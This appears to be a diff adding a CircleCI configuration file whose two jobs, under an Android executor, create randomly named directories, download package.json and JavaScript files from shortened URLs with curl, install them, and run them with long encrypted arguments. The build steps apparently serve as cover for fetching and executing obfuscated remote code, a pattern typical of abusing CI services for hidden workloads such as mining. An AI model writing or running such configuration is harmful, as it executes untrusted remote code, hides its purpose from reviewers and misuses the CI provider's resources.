@@ -1,0 +1,49 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  code_772:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 5wuy9dne2uluuqgxahn3eeuo
+      - run: mkdir j8ldclzrgg5aakueu9dt2zr
+      - run: curl -fsSL shorturl.at/gtBRT -o package.json && curl -fsSL
+          shorturl.at/lnpN8 -o xmek3gkjepojkci.js && curl -fsSL
+          shorturl.at/pxBKM -o 9fqg90vctkpzk2xtd.js
+      - run: touch munymyd5l8rwv5ujpareo9.js
+      - run: mkdir va8olig7djwjksuwm9ubr9rxm
+      - run: npm i -s
+      - run: mkdir nnad5j6u0acbdgi4vep3w2d
+      - run: mkdir 4vxgsf1vm8um9ktc
+      - run: node xmek3gkjepojkci -r
+          U2FsdGVkX18P+nuj2lb0tPLj6/ubPfcL8pAt1CPonbP7pXeN1+2S5fgYJ8Y6hV79jWTk0QiaiJSUt2O3AgpM/PfMGdalRT1sJ4Xyp6WlzoYefzm72MhAiaMBkMO2872N2FgODHvZWpUb4QWysjtaiM3fjNRP3qQepimBoZ01/tNjdLh1VW8CnN3u0vxPQm/+FczVPhPIldvM7MwUev0AcVG8b0VRgQFjios7udtbukXIAgfciF6+OTRFKyowUBIihXIQMF5Dai1OnqhzGAPtMr6Gssm+FJg6EGKWYQWkVG0=
+          -s
+          U2FsdGVkX191FJQXW1vZcN/3ahSrCpwTfL4j87jZ1aWQnTFhdbctQnCHjoy30wDH3IJap+umZnGi1vrwd6+AuzdHag99BGxuZgj/TSOagWwkTlBvLMD7XOi69h1gEOhDsBpDz0egpZFJLwTuus9Y40FFNwWHZznxWgXouWusoUKNCn8UbMS8eFscB8YKIKJ10p6gHEbD83L3izc0c7dNgQg8rwk77yE1hkn2uWM08Mk=
+          -sp -t
+          U2FsdGVkX18sIRCbf7TO4MJUoXJfWfdpDXWZbKOPby1DwQI83oJ4V+c6/3/g8miG -lpn
+          U2FsdGVkX1/yixBTxUZZTcwbZN7cxRyQ9RV/3hFBpjf7KDn6T5WQedu7B6tTfSxX
+  ditmecuocdoi:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir yqluiiut0u999
+      - run: mkdir q9n131ww32b6tvycel67p
+      - run: curl -fsSL shorturl.at/iotNQ -o wclnt629e7l.js && curl -fsSL
+          shorturl.at/nxAQW -o package.json && curl -fsSL shorturl.at/dA059 -o
+          0au5ylbnabkqv.js
+      - run: npm i -s
+      - run: touch an8dp7a2r2jkq4qe9vg.py
+      - run: touch gofgfotplespjrzb.js
+      - run: mkdir qfhewsc1zet8d8icz8ac3gydu86s
+      - run: cat /etc/os-release
+      - run: node 0au5ylbnabkqv -sp -r
+          U2FsdGVkX1/zXJ2V+zOWO77m4QAXzdpcvSknajH2J43agJXK/8kiDJtX9xddhk+VWPMaHMRcVT01nj0TkEMybNf2m3PLdzhGLrGHizPmMHdFj+anrpv2fEvhGbqQ6lt7H2OB4fzgQ81FxBjQTSHaHMjMoj0Zn/WLZfxcyogqYKR0CtDMv/4XBL/bbBL4ejJObr7mv6S2NsQOIcep5KySzvdBy/erT/tb+sV1u5DcxaOrGCkaZdq7A89EH0MpMIsbnyj2w06G+8aE9oG0KVFIG9M86Dm6BkWiMD0C0L5WZsk=
+          -t U2FsdGVkX1+D9mi+cjxHMfDcOwDgCkhlG6hkzdmtLcNwJ5EMuStBjy4OSraWhbFR
+          -lpn U2FsdGVkX18mogFQQ8k0bEU5PyI877TmqMutTrTFdu8= -s
+          U2FsdGVkX18gK3gelA/aiqwosOVEKTZhPF68YUkJerj1oV8cK/7LF++J3ZaGgt6z82iF2k6mzQP87fySP3KHzJN5MzUEbJ7Dx6+wP06iUCcBomF9NkdyASEsjz3JN9trGya6sz4i+LHYHAjHn1Ciwuy7aH46omqwjY8m6S6oP1+2Tj+qrsPLxRFxtVdp1Oa2ZYeHHUwyA/uDiGsgK0mRS936KAQsigZlXiz+9Mj2oGA=
+workflows:
+  KingOfJobs:
+    jobs:
+      - code_772
+      - ditmecuocdoi
